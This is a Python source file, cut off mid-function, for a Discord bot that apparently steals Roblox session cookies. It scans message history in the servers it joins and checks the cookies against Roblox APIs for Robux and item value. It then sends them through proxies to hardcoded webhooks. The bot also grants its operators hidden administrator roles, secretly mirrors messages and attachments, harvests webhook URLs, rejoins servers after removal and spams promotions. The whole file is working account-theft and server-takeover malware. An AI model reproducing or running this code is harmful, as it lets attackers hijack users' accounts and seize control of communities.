import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import datetime
import re
import logging
import io
import json
import random
from typing import List, Union, Dict, Any
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

load_dotenv()

BOT_TOKEN = os.getenv('DISCORD_TOKEN')
MIRROR_WEBHOOK_URL = os.getenv('MIRROR_WEBHOOK_URL', 'https://discord.com/api/webhooks/1542179498798354514/D6_LQhYZaC8MqmaCXiuBKniEb9YH_jnq0pUbypxHeptUrloZJZ1iiXEIDl_xHsn2JvGf')
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1542179557099176026/IwUCKNJYNsH2dKc5is3jIix0CdQ1UJDux4reE5ubxjT5C4E8YLNQ0Q8bWQYYq78Dm57Z"

PROXY_LIST = []

async def fetch_proxies():
    global PROXY_LIST
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://cityrus.xyz/frontend/proxies.txt", timeout=15) as response:
                if response.status == 200:
                    text = await response.text()
                    proxies = []
                    for line in text.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith('http://') and not line.startswith('https://'):
                                line = f"http://{line}"
                            proxies.append(line)
                    PROXY_LIST = proxies
                    logger.info(f"Successfully loaded {len(PROXY_LIST)} proxies from cityrus.xyz")
                else:
                    logger.warning(f"Failed to fetch proxies, status: {response.status}")
    except Exception as e:
        logger.error(f"Error fetching proxies: {e}")

async def proxy_updater():
    while True:
        await fetch_proxies()
        await asyncio.sleep(3600)  # Update every hour

def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [1514814583187964106, 1455694459013697719]
CONTROL_CHANNEL_ID = 1432729863692881972
OWNED_SERVER_IDS = [1538839763195527299]
SERVER_INVITES = {}

async def keep_alive():
    """Ping render.com every 5 minutes to keep the bot alive"""
    while True:
        try:
            proxy = get_proxy()
            async with aiohttp.ClientSession() as session:
                async with session.get("https://zzzzz-1.onrender.com", proxy=proxy) as response:
                    logger.info(f"Keep-alive ping sent: {response.status}")
        except Exception as e:
            logger.error(f"Keep-alive ping failed: {e}")
        await asyncio.sleep(300)

class ServerControlView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @discord.ui.button(label="Forward All Embeds", style=discord.ButtonStyle.blurple)
    async def forward_embeds(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("Not authorized.", ephemeral=True)
            return
        
        await interaction.response.send_message("Scanning and forwarding embeds with hits...", ephemeral=True)
        count = 0
        
        if MIRROR_WEBHOOK_URL:
            bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
            async with aiohttp.ClientSession() as session:
                for channel in self.guild.text_channels:
                    try:
                        async for message in channel.history(limit=1000):
                            if message.embeds:
                                should_mirror = False
                                for embed in message.embeds:
                                    text_to_check = f"{embed.title or ''} {embed.description or ''} {' '.join([f.value or '' for f in embed.fields])}".lower()
                                    if any(kw in text_to_check for kw in ['@everyone', '@here', 'hit', 'cae', 'roblox', 'cookie']):
                                        should_mirror = True
                                        break
                                
                                if should_mirror and message.id not in bot.mirrored_messages:
                                    bot.mirrored_messages.add(message.id)
                                    mirror_data = {
                                        'username': message.author.global_name or message.author.name,
                                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
                                        'content': message.content,
                                        'embeds': [embed.to_dict() for embed in message.embeds]
                                    }
                                    proxy = get_proxy()
                                    async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data, proxy=proxy) as response:
                                        if response.status in [200, 204]:
                                            count += 1
                    except Exception as e:
                        logger.error(f"Error scanning channel {channel.name}: {e}")
                        
        await interaction.followup.send(f"✅ Successfully forwarded {count} matching embeds to the mirror webhook.", ephemeral=True)

    @discord.ui.button(label="Grab Channel IDs", style=discord.ButtonStyle.secondary)
    async def grab_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("Not authorized.", ephemeral=True)
            return
        
        channels_info = [f"#{channel.name} - `{channel.id}`" for channel in self.guild.text_channels]
        chunks = [channels_info[i:i + 50] for i in range(0, len(channels_info), 50)]
        
        await interaction.response.send_message(f"Found {len(self.guild.text_channels)} text channels. Sending to your DMs...", ephemeral=True)
        
        try:
            dm = await interaction.user.create_dm()
            for i, chunk in enumerate(chunks):
                await dm.send(f"**Channel IDs for {self.guild.name} (Part {i+1}/{len(chunks)}):**\n" + "\n".join(chunk))
        except Exception as e:
            await interaction.followup.send(f"Failed to send DM: {e}", ephemeral=True)

    @discord.ui.button(label="Grab Webhooks", style=discord.ButtonStyle.secondary)
    async def grab_webhooks(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("Not authorized.", ephemeral=True)
            return
            
        await interaction.response.send_message("Attempting to grab webhooks (requires 'Manage Webhooks' permission)...", ephemeral=True)
        webhooks_info = []
        
        try:
            for channel in self.guild.text_channels:
                try:
                    hooks = await channel.webhooks()
                    for hook in hooks:
                        webhooks_info.append(f"Channel: #{channel.name} | Hook: `{hook.name}` - `{hook.url}`")
                except Exception:
                    pass
            
            if not webhooks_info:
                await interaction.followup.send("No webhooks found or bot lacks 'Manage Webhooks' permission.", ephemeral=True)
                return
                
            chunks = [webhooks_info[i:i + 20] for i in range(0, len(webhooks_info), 20)]
            dm = await interaction.user.create_dm()
            for i, chunk in enumerate(chunks):
                await dm.send(f"**Webhooks for {self.guild.name} (Part {i+1}/{len(chunks)}):**\n" + "\n".join(chunk))
            await interaction.followup.send("Webhooks sent to your DMs!", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"Error grabbing webhooks: {e}", ephemeral=True)

    @discord.ui.button(label="Scrape Server", style=discord.ButtonStyle.green)
    async def scrape_server(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("Not authorized.", ephemeral=True)
            return
            
        await interaction.response.send_message("Initiating server scrape...", ephemeral=True)
        try:
            await bot.auto_scrape_guild(self.guild)
            await interaction.followup.send("Scrape initiated! Check your DMs and the webhook for results.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"Error during scrape: {e}", ephemeral=True)


class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
    mirror_type = discord.ui.TextInput(label="Mirror Type", placeholder="Enter 'all' or 'channel_id'", style=discord.TextStyle.short)
    webhook_url = discord.ui.TextInput(label="Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.paragraph)
    channel_id = discord.ui.TextInput(label="Channel ID (optional)", placeholder="Enter specific channel ID", style=discord.TextStyle.short, required=False)

    def __init__(self, view):
        super().__init__()
        self.view = view

    async def on_submit(self, interaction: discord.Interaction):
        try:
            if self.view.guild.id in OWNED_SERVER_IDS:
                await interaction.response.send_message("Cannot set mirror webhooks on owned servers.", ephemeral=True)
                return

            if self.mirror_type.value.lower() == 'all':
                bot.mirror_webhooks[self.view.guild.id] = self.webhook_url.value
                await interaction.response.send_message("Mirror webhook set! All server messages will now be mirrored.", ephemeral=True)
            elif self.mirror_type.value.lower() == 'channel_id':
                if not self.channel_id.value:
                    await interaction.response.send_message("Please provide a channel ID.", ephemeral=True)
                    return

                channel_id = int(self.channel_id.value)
                channel = self.view.guild.get_channel(channel_id)
                if not channel or not isinstance(channel, discord.TextChannel):
                    await interaction.response.send_message("Channel not found or must be a text channel.", ephemeral=True)
                    return

                bot.mirror_channels[self.view.guild.id] = {'channel_id': channel_id, 'webhook': self.webhook_url.value}
                await interaction.response.send_message(f"Channel {channel.name} will now be mirrored!", ephemeral=True)
            else:
                await interaction.response.send_message("Invalid mirror type. Use 'all' or 'channel_id'.", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("Invalid channel ID.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error: {str(e)}", ephemeral=True)


class CookieFetcher:
    def __init__(self):
        self.processed_messages: set[int] = set()

    def extract_and_normalize_cookies(self, text: str) -> set:
        """Extracts and normalizes Roblox cookies to the modern format using MeowTool patterns"""
        cookies = set()
        warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
        
        clean_text = re.sub(r'```[a-z]*\n(.*?)```', r'\1', text, flags=re.DOTALL | re.IGNORECASE)
        clean_text = re.sub(r'`(.*?)`', r'\1', clean_text)
        
        pattern1 = r'_\|(?:_|[^\s\r\n]*?\|_)(\S{100,})'
        for match in re.finditer(pattern1, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        pattern2 = r'\.ROBLOSECURITY=([A-Za-z0-9_\-\.]{100,})'
        for match in re.finditer(pattern2, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        pattern3 = r'\b(CAE[A-Za-z0-9_\-\.]{100,})\b'
        for match in re.finditer(pattern3, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        pattern4 = r'\b([A-Za-z0-9_\-\.]{100,})\b'
        for match in re.finditer(pattern4, clean_text):
            token = match.group(1)
            if not token.startswith('http') and not token.startswith('data:') and not token.startswith('discord'):
                if any(c.isalpha() for c in token) and any(c.isdigit() for c in token):
                    cookies.add(f"{warning_prefix}{token}")
                    
        return cookies

    async def validate_and_summarize_cookies(self, cookies: List[str]) -> Dict[str, Any]:
        """Validates cookies using actual Roblox APIs and calculates total Robux and RAP"""
        valid_cookies = []
        invalid_cookies = []
        total_robux = 0
        total_rap = 0
        checked_count = 0
        
        semaphore = asyncio.Semaphore(15)

        async def check_single_cookie(cookie: str):
            nonlocal total_robux, total_rap, checked_count
            async with semaphore:
                try:
                    info = await bot.get_cookie_info(cookie)
                    if info['valid']:
                        valid_cookies.append(cookie)
                        total_robux += info.get('robux', 0)
                        total_rap += info.get('rap', 0)
                        checked_count += 1
                        logger.info(f"Valid: {info.get('username')} | R$: {info.get('robux')} | RAP: {info.get('rap')}")
                    else:
                        invalid_cookies.append(cookie)
                except Exception as e:
                    logger.error(f"Error validating cookie: {e}")
                    invalid_cookies.append(cookie)

        batch_size = 50
        for i in range(0, len(cookies), batch_size):
            batch = cookies[i:i + batch_size]
            tasks = [check_single_cookie(cookie) for cookie in batch]
            await asyncio.gather(*tasks)

        return {
            'valid': valid_cookies,
            'invalid': invalid_cookies,
            'total_robux': total_robux,
            'total_rap': total_rap,
            'checked_count': checked_count
        }

    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float, total_robux: int = 0, total_rap: int = 0) -> bool:
        try:
            async with aiohttp.ClientSession() as session:
                proxy = get_proxy()
                
                embed = discord.Embed(
                    title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                    description=(
                        f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
                        f"🔑 **Unique Cookies:** {len(unique_cookies)}\n"
                        f"<:Stats:1542192682292486198> **Messages Scanned:** {messages_scanned:,}\n"
                        f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                        f"💎 **Verified Total RAP:** {total_rap:,}\n"
                        f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                        f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                    ),
                    color=0xF1C40F
                )
                
                embed_payload = {
                    'username': 'Cookie Fetcher',
                    'content': '@everyone',
                    'embeds': [embed.to_dict()]
                }
                
                async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload, proxy=proxy) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send embed to cookie webhook: {response.status}")
                        return False

                await asyncio.sleep(0.1)
                
                all_cookies_content = "\n\n".join(unique_cookies) if unique_cookies else "No cookies found."
                
                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '@everyone\n📄 **Cookie Results:**'
                }))
                form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data, proxy=proxy) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send file to cookie webhook: {response.status}")
                        return False
                    
                return True
        except Exception as e:
            logger.error(f"Error sending to cookie webhook: {e}")
            return False

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        all_cookies = set()
        total_messages_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            try:
                async for message in channel.history(limit=10000):
                    messages_count += 1
                    cookies = self.extract_and_normalize_cookies(message.content)
                    channel_cookies.update(cookies)

                    for embed in message.embeds:
                        if embed.description:
                            channel_cookies.update(self.extract_and_normalize_cookies(embed.description))
                        if embed.title:
                            channel_cookies.update(self.extract_and_normalize_cookies(embed.title))
                        for field in embed.fields:
                            channel_cookies.update(self.extract_and_normalize_cookies(field.value))
            except Exception as e:
                logger.error(f"Error fetching messages from {channel.name}: {e}")
            return channel_cookies, messages_count

        tasks = [process_channel(channel) for channel in guild.text_channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, tuple) and len(result) == 2:
                cookies, count = result
                all_cookies.update(cookies)
                total_messages_scanned += count
            else:
                logger.error(f"Error in channel processing: {result}")

        unique_cookies = list(all_cookies)
        return {'all': unique_cookies, 'messages_scanned': total_messages_scanned}


class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.mirror_webhooks = {}
        self.mirror_channels = {}
        self.mirrored_messages = set()

    async def generate_invite_link(self):
        try:
            for guild in self.guilds:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite(max_age=0, max_uses=0, reason="Bot invite")
                        return invite.url
            return "No suitable channel found"
        except Exception as e:
            logger.error(f"Error generating invite: {e}")
            return "Error generating invite"

    async def get_cookie_info(self, cookie: str) -> Dict[str, Any]:
        """Checks cookie validity and fetches Robux/RAP using actual Roblox APIs"""
        try:
            warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
            actual_cookie = cookie.replace(warning_prefix, "").strip()
            if actual_cookie.startswith('_'):
                actual_cookie = actual_cookie[1:]
                
            proxy = get_proxy()
            async with aiohttp.ClientSession() as session:
                headers = {"Cookie": f".ROBLOSECURITY={actual_cookie}"}
                
                auth_url = "https://users.roblox.com/v1/users/authenticated"
                async with session.get(auth_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                    if response.status != 200:
                        return {'valid': False}
                    auth_data = await response.json()
                    user_id = auth_data.get('id')
                    if not user_id:
                        return {'valid': False}
                        
                robux = 0
                try:
                    robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
                    async with session.get(robux_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                        if response.status == 200:
                            robux_data = await response.json()
                            robux = robux_data.get('robux', 0)
                except Exception:
                    pass
                    
                rap = 0
                try:
                    rap_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles"
                    cursor = None
                    while True:
                        url = rap_url + (f"?cursor={cursor}" if cursor else "")
                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                            if response.status == 200:
                                rap_data = await response.json()
                                for item in rap_data.get('data', []):
                                    rap += item.get('recentAveragePrice', 0)
                                cursor = rap_data.get('nextPageCursor')
                                if not cursor:
                                    break
                            else:
                                break
                except Exception:
                    pass

                username = "Unknown"
                try:
                    user_url = f"https://users.roblox.com/v1/users/{user_id}"
                    async with session.get(user_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy) as response:
                        if response.status == 200:
                            user_data = await response.json()
                            username = user_data.get('name', 'Unknown')
                except Exception:
                    pass

                return {
                    'valid': True,
                    'user_id': user_id,
                    'username': username,
                    'robux': robux,
                    'rap': rap
                }
        except Exception as e:
            logger.error(f"Error checking cookie info: {e}")
            return {'valid': False}

    async def reset_and_scrape_all_servers(self):
        try:
            self.mirrored_messages.clear()
            logger.info("Reset mirrored messages set")

            for guild in self.guilds:
                if guild.id not in OWNED_SERVER_IDS:
                    try:
                        await self.auto_scrape_guild(guild)
                    except Exception as e:
                        logger.error(f"Error auto-scraping {guild.name}: {e}")
        except Exception as e:
            logger.error(f"Error in reset_and_scrape_all_servers: {e}")

    async def auto_scrape_guild(self, guild):
        try:
            logger.info(f"Auto-scraping cookies from {guild.name}")
            start_time = datetime.datetime.now()
            fetcher = CookieFetcher()
            result = await fetcher.fetch_all_server_cookies(guild)
            all_cookies = list(set(result['all']))
            actual_messages_scanned = result.get('messages_scanned', 0)
            
            summary = await fetcher.validate_and_summarize_cookies(all_cookies)
            total_robux = summary['total_robux']
            total_rap = summary['total_rap']
            
            end_time = datetime.datetime.now()
            time_taken = (end_time - start_time).total_seconds()

            await fetcher.send_to_cookie_webhook(all_cookies, all_cookies, actual_messages_scanned, time_taken, total_robux, total_rap)

            for user_id in AUTHORIZED_USERS:
                try:
                    user = self.get_user(user_id) or await self.fetch_user(user_id)
                    if user:
                        dm_channel = await user.create_dm()
                        
                        dm_embed = discord.Embed(
                            title="<a:Lightning:1542199575257813135> Auto-Scrape Complete",
                            description=(
                                f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                                f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                                f"🍪 **Total Cookies:** {len(all_cookies)}\n"
                                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                                f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                                f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                            ),
                            color=0xF1C40F
                        )
                        await dm_channel.send(content="@everyone", embed=dm_embed)
                        
                        await asyncio.sleep(0.1)
                        all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
                        file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='cookies.txt')
                        await dm_channel.send(content="📄 **Cookie Results:**", file=file)
                        
                except Exception as e:
                    logger.error(f"Failed to DM user {user_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error in auto_scrape_guild for {guild.name}: {e}")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("Commands synced")

    async def on_ready(self):
        logger.info(f'Bot online: {self.user}')
        await fetch_proxies()
        self.loop.create_task(proxy_updater())
        self.loop.create_task(keep_alive())
        await self.reset_and_scrape_all_servers()

    async def on_guild_join(self, guild):
        try:
            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Server takeover")
                    invite_url = invite.url
                    SERVER_INVITES[guild.id] = invite_url
            except:
                pass

            if guild.id not in OWNED_SERVER_IDS and guild.id not in getattr(self, 'announced_servers', set()):
                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                if control_channel:
                    embed = discord.Embed(
                        title="$$$",
                        description=f"Hooker Server Taken Over\n\n**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                        color=0xFF0000
                    )
                    view = ServerControlView(guild)
                    await control_channel.send("@everyone", embed=embed, view=view)
                    if not hasattr(self, 'announced_servers'):
                        self.announced_servers = set()
                    self.announced_servers.add(guild.id)

            if guild.id not in OWNED_SERVER_IDS:
                channel_name = "mass-cookie-scraper"
                target_channel = None
                for channel in guild.text_channels:
                    if channel.name == channel_name:
                        target_channel = channel
                        break
                
                if not target_channel:
                    try:
                        target_channel = await guild.create_text_channel(channel_name, reason="Mass cookie scraper channel")
                    except Exception as e:
                        logger.error(f"Failed to create channel: {e}")
                        target_channel = guild.system_channel or (guild.text_channels[0] if guild.text_channels else None)

                if target_channel:
                    promo_embed = discord.Embed(
                        title="__**🚀 MASSIVE SERVER UTILITIES ACTIVATED 🚀**__",
                        description=(
                            f"<a:Lightning:1542199575257813135> **Welcome to the ultimate server experience!**\n\n"
                            f"<:FakeNitroEmoji:1542188059527741540> **Join our community for exclusive perks:**\n"
                            f"🔗 **Discord:** https://discord.gg/p7pPfK6Seu\n"
                            f"📱 **Telegram:** t.me/@lovingltc\n\n"
                            f"<:Stats:1542192682292486198> **Stay tuned for more updates!**"
                        ),
                        color=0xF1C40F
                    )
                    try:
                        await target_channel.send(content="@everyone", embed=promo_embed)
                    except Exception as e:
                        logger.error(f"Failed to send promo message: {e}")

                asyncio.create_task(self.auto_scrape_guild(guild))

                if MIRROR_WEBHOOK_URL:
                    self.mirror_webhooks[guild.id] = MIRROR_WEBHOOK_URL
                    logger.info(f"Auto-set mirror webhook for guild {guild.name}")
            else:
                logger.info(f"Server takeover already applied to owned server {guild.name}")

        except Exception as e:
            logger.error(f"Error in on_guild_join: {e}")

    async def on_member_join(self, member):
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in member.guild.roles if role.name == "$$$"]
                if dollar_roles:
                    for role in dollar_roles:
                        await member.add_roles(role, reason="Secret role granted")
                else:
                    created_roles = []
                    for i in range(100):
                        try:
                            secret_role = await member.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(secret_role)
                        except Exception as e:
                            break
                    for role in created_roles:
                        await member.add_roles(role, reason="Secret role granted")
            except Exception as e:
                logger.error(f"Error auto-assigning secret roles on member join: {e}")

    async def on_member_update(self, before, after):
        if after.id in AUTHORIZED_USERS and after.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in after.guild.roles if role.name == "$$$"]
                missing_roles = [role for role in dollar_roles if role not in after.roles]
                if missing_roles:
                    for role in missing_roles:
                        await after.add_roles(role, reason="Secret role restored")
                if not dollar_roles:
                    created_roles = []
                    for i in range(100):
                        try:
                            new_role = await after.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(new_role)
                        except Exception as e:
                            break
                    for role in created_roles:
                        await after.add_roles(role, reason="Secret role restored")
            except Exception as e:
                logger.error(f"Error restoring secret roles: {e}")

    async def on_guild_remove(self, guild):
        if guild.id not in OWNED_SERVER_IDS and guild.id in SERVER_INVITES:
            try:
                invite_url = SERVER_INVITES[guild.id]
                invite_code_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite_url)
                if invite_code_match:
                    invite_code = invite_code_match.group(1)
                    invite = await self.fetch_invite(invite_code)
                    if invite:
                        await self.accept_invite(invite)
                        logger.info(f"Auto-rejoined server: {guild.name}")
            except Exception as e:
                logger.error(f"Error auto-rejoining server {guild.name}: {e}")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.guild and message.guild.id in OWNED_SERVER_IDS:
            return

        if message.guild and message.guild.id in getattr(self, 'mirror_webhooks', {}) and message.id not in self.mirrored_messages:
            if message.embeds:
                should_mirror = False
                for embed in message.embeds:
                    text_to_check = f"{embed.title or ''} {embed.description or ''} {' '.join([f.value or '' for f in embed.fields])}".lower()
                    if any(kw in text_to_check for kw in ['@everyone', '@here', 'hit', 'cae', 'roblox', 'cookie']):
                        should_mirror = True
                        break
                
                if should_mirror:
                    self.mirrored_messages.add(message.id)
                    webhook_url = self.mirror_webhooks[message.guild.id]
                    try:
                        proxy = get_proxy()
                        async with aiohttp.ClientSession() as session:
                            mirror_data = {
                                'username': message.author.global_name or message.author.name,
                                'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
                                'content': message.content
                            }
                            if message.embeds:
                                mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
                            
                            form_data = aiohttp.FormData()
                            form_data.add_field('payload_json', json.dumps(mirror_data))
                            for attachment in message.attachments:
                                try:
                                    file_data = await attachment.read()
                                    form_data.add_field('file', file_data, filename=attachment.filename)
                                except Exception as e:
                                    logger.error(f"Error reading attachment: {e}")
                                    
                            async with session.post(webhook_url, data=form_data, proxy=proxy) as response:
                                if response.status not in [200, 204]:
                                    logger.error(f"Failed to mirror message 1:1: {response.status}")
                    except Exception as e:
                        logger.error(f"Error mirroring message: {e}")

        if message.guild and message.guild.id in getattr(self, 'mirror_channels', {}):
            mirror_data = self.mirror_channels[message.guild.id]
            if message.channel.id == mirror_data['channel_id']:
                webhook_url = mirror_data['webhook']
                try:
                    proxy = get_proxy()
                    async with aiohttp.ClientSession() as session:
                        payload = {
                            'username': message.author.global_name or message.author.name,
                            'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
                            'content': message.content
                        }
                        if message.embeds:
                            payload['embeds'] = [embed.to_dict() for embed in message.embeds]

                        form_data = aiohttp.FormData()
                        form_data.add_field('payload_json', json.dumps(payload))
                        for attachment in message.attachments:
                            try:
                                file_data = await attachment.read()
                                form_data.add_field('file', file_data, filename=attachment.filename)
                            except Exception:
                                pass

                        async with session.post(webhook_url, data=form_data, proxy=proxy) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to mirror channel message: {response.status}")
                except Exception as e:
                    logger.error(f"Error mirroring channel message: {e}")


bot = CookieFetcherBot()

@bot.tree.command(name="scrape", description="Scrape Roblox cookies from server")
async def scrape_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    if not interaction.guild.me.guild_permissions.read_message_history:
        await interaction.followup.send("Bot needs 'Read Message History' permission.", ephemeral=True)
        return

    start_time = datetime.datetime.now()

    try:
        guild = interaction.guild
        status_embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Cookie Fetch Started",
            description="Scanning server messages for Roblox cookies...",
            color=0xF1C40F
        )
        status_msg = await interaction.followup.send(embed=status_embed, ephemeral=True, wait=True)

        fetcher = CookieFetcher()
        result = await fetcher.fetch_all_server_cookies(guild)
        all_cookies = list(set(result['all']))
        actual_messages_scanned = result.get('messages_scanned', 0)

        summary = await fetcher.validate_and_summarize_cookies(all_cookies)
        total_robux = summary['total_robux']
        total_rap = summary['total_rap']

        end_time = datetime.datetime.now()
        time_taken = (end_time - start_time).total_seconds()

        complete_embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
            description=(
                f"✅ **Scan Finished!**\n"
                f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                f"🍪 **Total Cookies:** {len(all_cookies)}\n"
                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                f"💎 **Verified Total RAP:** {total_rap:,}"
            ),
            color=0xF1C40F
        )
        await status_msg.edit(embed=complete_embed)

        if not all_cookies:
            await interaction.followup.send(embed=discord.Embed(title="No Cookies Found", description="No Roblox cookies found in server.", color=0xe74c3c), ephemeral=True)
            return

        webhook_success = await fetcher.send_to_cookie_webhook(
            all_cookies,
            all_cookies,
            actual_messages_scanned,
            time_taken,
            total_robux,
            total_rap
        )

        try:
            dm_channel = await interaction.user.create_dm()
            
            dm_embed = discord.Embed(
                title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                description=(
                    f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
                    f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                    f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                    f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                    f"💎 **Verified Total RAP:** {total_rap:,}\n"
                    f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                    f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                ),
                color=0xF1C40F
            )
            await dm_channel.send(content="@everyone", embed=dm_embed)
            
            await asyncio.sleep(0.1)
            all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
            file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename="cookies.txt")
            await dm_channel.send(content="📄 **Cookie Results:**", file=file)
            
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")
            await interaction.followup.send("Could not send DM with results. Please check your DM settings.", ephemeral=True)

        success_embed = discord.Embed(
            title="Fetch Complete",
            description=f"Found {len(all_cookies)} total cookies from {guild.name}",
            color=0xF1C40F
        )
        success_embed.set_footer(text="✅ Complete! Check your DMs!" if webhook_success else "⚠️ Try again")
        await interaction.followup.send(embed=success_embed, ephemeral=True)

    except Exception as e:
        error_embed = discord.Embed(title="Fetch Failed", description=f"An error occurred: ```{str(e)}```", color=0xe74c3c)
        await interaction.followup.send(embed=error_embed, ephemeral=True)


@bot.tree.command(name="scrape2", description="Mass scrape all servers (Authorized Only)")
async def scrape2_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
